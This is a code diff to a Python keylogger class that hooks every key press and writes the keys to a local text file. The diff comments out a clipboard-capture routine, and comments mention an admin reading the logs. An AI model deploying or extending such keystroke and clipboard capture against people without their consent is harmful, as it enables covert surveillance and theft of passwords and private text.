@@ -19,7 +19,6 @@ def event_to_string(event):
     elif event.name != 'backspace':  # Should always be regular characters.
         string = event.name
     elif event.name == 'backspace':  # Separated from rest, to allow updates.
-        # TODO: make it easier for the admin to SEE backspaces instead of having to read them.
         string = '[BACKSPACE]'
     else:
         print(event.name)  # Should never happen.
@@ -29,23 +28,25 @@ def event_to_string(event):
 
 
 class KeysClipboardLogger:
-    def __init__(self, file):
+    def __init__(self, csv_file):
         self.old_clipboard = None
         self.current_clipboard = None
-        self.logged_keys = 0
-        self.working_file = file
+        self.working_file = csv_file
+        self.current_keys_file = open("current_keys_file.txt", "w")
 
         self.start_keylogger()
 
-    def log_clipboard(self):
-        self.current_clipboard = pc.paste()
-        if self.current_clipboard != self.old_clipboard:
-            self.working_file.write(f"\n[CLIPBOARD DATA: {self.current_clipboard}]\n")
-            self.old_clipboard = self.current_clipboard
+    # def log_clipboard(self):
+    #     self.current_clipboard = pc.paste()
+    #     # Als clipboard != string, dan niet plakken. Wel schrijven type van wat is gekopieerd, bijv. bestand of afbeelding.
+    #     if self.current_clipboard != self.old_clipboard:
+    #         # Return only the important data, make one writerow in moso.py
+    #         self.working_file.write(f"{datetime.now()},{self.current_clipboard}]")
+    #         self.old_clipboard = self.current_clipboard
 
     def start_keylogger(self):
         def on_press(event):
-            self.working_file.write(event_to_string(event))
+            self.current_keys_file.write(event_to_string(event))
 
         kb.on_press(on_press)
 
